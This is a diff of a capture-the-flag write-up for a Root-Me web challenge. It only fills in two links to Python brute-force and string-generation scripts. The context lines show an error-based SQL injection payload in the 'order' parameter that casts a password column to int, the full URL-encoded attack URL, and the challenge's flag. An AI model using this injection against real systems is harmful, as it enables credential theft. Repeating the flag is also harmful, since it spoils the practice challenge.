@@ -133,6 +133,6 @@ asc, cast((select p455w0rd_c0l from m3mbr35t4bl3 limit 1 offset 0) as int)
 
 Final payload http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=asc,%20cast((select%20p455w0rd_c0l%20from%20m3mbr35t4bl3%20limit%201%20offset%200)%20as%20int)
 
-Code Python used: [Brute-force]() and [Generating string]()
+Code Python used: [Brute-force](Brute-force.py) and [Generating string](Generating_string.py)
 
 Flag: **1a2BdKT5DIx3qxQN3UaC**
